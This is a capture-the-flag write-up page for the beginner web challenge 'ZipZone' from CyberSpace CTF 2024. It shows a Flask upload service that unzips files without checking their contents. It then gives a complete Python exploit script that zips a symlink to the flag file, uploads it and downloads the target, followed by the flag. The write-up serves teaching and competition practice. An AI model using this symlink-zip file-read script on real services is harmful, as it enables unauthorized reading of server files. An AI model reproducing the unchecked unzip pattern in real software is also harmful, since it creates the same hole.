               

<!DOCTYPE html>
<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>ZipZone - ByteTheCookies</title>

    

    

    
    <meta name="author" content="ByteTheCookies" />
    

    
        <meta property="og:url" content="http://localhost:1313/writeups/cyberspace2024/zipzone/">
  <meta property="og:site_name" content="ByteTheCookies">
  <meta property="og:title" content="ZipZone">
  <meta property="og:description" content="Zipzone Description: I was tired of trying to find a good file server for zip files, so I made my own! It‚Äôs still a work in progress, but I think it‚Äôs pretty good so far.
Link: https://zipzone-web.challs.csc.tf/
Introduction ZipZone is the only one web in the beginner‚Äôs category and, as the title suggests, you have to upload zip files that will be unzipped later, so you have to download the extracted files afterwards.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-09-02T10:59:17+02:00">
    <meta property="article:modified_time" content="2024-09-02T14:35:32+02:00">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Python">
    <meta property="article:tag" content="Symlink">
    <meta property="article:tag" content="50 Points">
    <meta property="article:tag" content="173 Solves">
    <meta property="article:tag" content="Rex">

    

    
        
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="ZipZone">
  <meta name="twitter:description" content="Zipzone Description: I was tired of trying to find a good file server for zip files, so I made my own! It‚Äôs still a work in progress, but I think it‚Äôs pretty good so far.
Link: https://zipzone-web.challs.csc.tf/
Introduction ZipZone is the only one web in the beginner‚Äôs category and, as the title suggests, you have to upload zip files that will be unzipped later, so you have to download the extracted files afterwards.">

    <link rel="stylesheet" href="/style.css" integrity="">



    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">



    
    <script>
        if (!('theme' in localStorage)) {
            localStorage.theme = 'dark';
        }

        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.setAttribute("data-theme", "dark");
        } else {
            document.documentElement.setAttribute("data-theme", "light");
        }
    </script>
<script defer src="/js/header.js" integrity=""></script>



    <script defer src="/js/zooming.js" integrity=""></script>







    
        

        
        

        
        
            
        

        <script defer src="/js/prism.js" integrity="" data-manual></script>
    



    
    
    
    <script defer src="/js/search-en.js" integrity=""></script>




<link rel="stylesheet" href="http://localhost:1313/user.css">

    
</head>
<body><header>
    <div id="header_left">
        <div id="sidebar_btn">
            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
            <label id="sidebar_btn_label" for="sidebar_btn_input">
                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
</svg>

</svg>
            </label>
            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
                <div id="sidebar_canvas_overlay"></div>
            </label>
            <div id="sidebar">
                <ul><li>
                            <a href="/">üíª About</a></li><li>
                            <a href="/news/">üì∞ News</a></li><li>
                            <a href="/writeups/">üìë Writeups</a></li><li>
                            <a href="/contacts/">‚úâÔ∏è Contacts</a></li></ul>
            </div>
        </div>
    
        <div class="brand">
            <div>
                <a href="/">ByteTheCookies</a>
            </div>
        </div>
    </div>

    <div class="toolbox">
        <div id="theme_tool">
            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
</svg>

</svg>
            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
</svg>

</svg>
        </div>

        
            <div id="search_tool">
                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
</svg>

</svg><div id="search_menu_wrapper" class="hidden">
    <div id="search_menu">
        <div id="search_menu_toolbar">
            <div id="search_menu_input_wrapper">
                <input id="search_menu_input" type="text" placeholder='Search Posts'>
            </div>
            <div id="search_menu_close_btn">
                <svg width="18px" height="18px" viewBox="0 0 24 24">
<svg
    xmlns="http://www.w3.org/2000/svg"
    width="24" height="24" viewBox="0 0 24 24" fill="none"
    stroke="currentColor" stroke-width="2" stroke-linecap="round"
    stroke-linejoin="round">
    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
</svg>

</svg>
            </div>
        </div>
        <div id="search_menu_results">
        </div>
    </div>
</div>
</div>
        

        
    </div>
</header>
<nav id="navbar" class="pure-menu">
    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
                    
                        <a href="/" class="pure-menu-link">üíª About</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/news/" class="pure-menu-link">üì∞ News</a>
                    
                </li><li class="navbar-item pure-menu-item insection">
                    
                        <a href="/writeups/" class="pure-menu-link">üìë Writeups</a>
                    
                </li><li class="navbar-item pure-menu-item ">
                    
                        <a href="/contacts/" class="pure-menu-link">‚úâÔ∏è Contacts</a>
                    
                </li></ul>
</nav>
<main>
      <div id="content" class="content-margin">
        
    
    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#source">Source</a></li>
    <li><a href="#solution">Solution</a></li>
  </ul>
</nav>
        
    </div></details>



<div class="tags">
  
    <div class="badge">Web</div>

  
    <div class="badge">Python</div>

  
    <div class="badge">Symlink</div>

  
    <div class="badge">50 points</div>

  
    <div class="badge">173 solves</div>

  
    <div class="badge">rex</div>

  
</div>

<div>
  <p class="date">
    Last edit: Sep 2, 2024
  </p>
</div>


    <div class="content-margin">



<article >
    
    
        
        
    
    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Zipzone</h1>
<p><strong>Description</strong>: I was tired of trying to find a good file server for zip files, so I made my own! It&rsquo;s still a work in progress, but I think it&rsquo;s pretty good so far.</p>
<p><strong>Link</strong>: <a href="https://zipzone-web.challs.csc.tf/">https://zipzone-web.challs.csc.tf/</a></p>

<h2>Introduction</h2>

<p>ZipZone is the only one web in the beginner&rsquo;s category and, as the title suggests, you have to upload zip files that will be unzipped later, so you have to download the extracted files afterwards.</p>

<h2>Source</h2>

<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: app.py

import logging
import os
import subprocess
import uuid

from flask import (
    Flask,
    abort,
    flash,
    redirect,
    render_template,
    request,
    send_from_directory,
)

app = Flask(__name__)
upload_dir = &quot;/tmp/&quot;

app.config[&quot;MAX_CONTENT_LENGTH&quot;] = 1 * 10**6  # 1 MB
app.config[&quot;SECRET_KEY&quot;] = os.urandom(32)


@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
def upload():
    if request.method == &quot;GET&quot;:
        return render_template(&quot;index.html&quot;)

    if &quot;file&quot; not in request.files:
        flash(&quot;No file part!&quot;, &quot;danger&quot;)
        return render_template(&quot;index.html&quot;)

    file = request.files[&quot;file&quot;]
    if file.filename.split(&quot;.&quot;)[-1].lower() != &quot;zip&quot;:
        flash(&quot;Only zip files allowed are allowed!&quot;, &quot;danger&quot;)
        return render_template(&quot;index.html&quot;)

    upload_uuid = str(uuid.uuid4())
    filename = f&quot;{upload_dir}raw/{upload_uuid}.zip&quot;
    file.save(filename)
    subprocess.call([&quot;unzip&quot;, filename, &quot;-d&quot;, f&quot;{upload_dir}files/{upload_uuid}&quot;])

    print(f&quot;Unzipped {filename} to {upload_dir}files/{upload_uuid}&quot;)

    flash(
        f'Your file is at &lt;a href=&quot;/files/{upload_uuid}&quot;&gt;{upload_uuid}&lt;/a&gt;!', &quot;success&quot;
    )
    logging.info(f&quot;User uploaded file {upload_uuid}.&quot;)
    return redirect(&quot;/&quot;)


@app.route(&quot;/files/&lt;path:path&gt;&quot;)
def files(path):
    try:
        return send_from_directory(upload_dir + &quot;files&quot;, path)
    except PermissionError:
        abort(404)


@app.errorhandler(404)
def page_not_found(error):
    return render_template(&quot;404.html&quot;)


if __name__ == &quot;__main__&quot;:
    app.run(debug=True, host=&quot;0.0.0.0&quot;, port=5000)

</code></pre>

<h2>Solution</h2>

<p>Being actually a web in the beginner category, I initially just gave a quick read to the source code, where in fact no checks are done on the files inside the zipper, but only on the zipper itself, where we see the extension is checked</p>
<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py

#!/usr/bin/python3

import os
import subprocess
import requests
from bs4 import BeautifulSoup

BASE_URL = &quot;https://zipzone-web.challs.csc.tf&quot;
URL_HOOK = &quot;&quot;

def get_uuid(text):
  soup = BeautifulSoup(text, 'html.parser')
  for a in soup.find_all('a', href=True):
    if a['href']:
      return a['href'].split('/')[-1]


def upload_file(file_path):
  with open(file_path, &quot;rb&quot;) as f:
    files = {&quot;file&quot;: f}
    response = requests.post(BASE_URL, files=files)
    return get_uuid(response.text)


def create_exploit(zip_filename:str,symlink_name:str,symlink_target:str):
    os.symlink(symlink_target, symlink_name)
    subprocess.run(['zip', '-y', zip_filename, symlink_name], check=True)
    print(f'{zip_filename} created.')
    os.remove(symlink_name)

def get_flag(UUID):
  response = requests.get(f'{BASE_URL}/files/{UUID}/evil_link',stream=True)
  if response.status_code == 200:
    with open(&quot;flag&quot;, 'wb') as f:
      for chunk in response.iter_content(chunk_size=8192):
        f.write(chunk)
    print(f&quot;Flag download successfully&quot;)
  else:
      print(f&quot;Error during the download: {response.status_code}&quot;)

  return open(&quot;flag&quot;, &quot;r&quot;).read().strip()

def clean():
    os.remove('exploit.zip')
    os.remove('flag')

def main():
  create_exploit(zip_filename='exploit.zip',symlink_name='evil_link',symlink_target='/home/user/flag.txt')
  UUID = upload_file('./exploit.zip')
  print(f'UUID: {UUID}')
  flag = get_flag(UUID)
  print(f&quot;Flag: {flag}&quot;)
  clean()

if __name__ == &quot;__main__&quot;:
  main()

# goodluck by @akiidjk

</code></pre>
<p>The solutions is very simple, A symlink is simply created pointing to /home/user/flag, it is then zipped and sent to the page, we save the file id and in the path uuid/name_file we send the file pointing to the symlink.</p>
<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: CSCTF{5yml1nk5_4r3_w31rd}
</code></pre>
<p align='right'>Author: akiidjk </p>

</article>
</div>
   
      </div>
    </main>
<footer>
    <article>Copyright ¬© 2024 by ByteTheCookies Team | v1.0</article>
</footer>

</body>
</html>
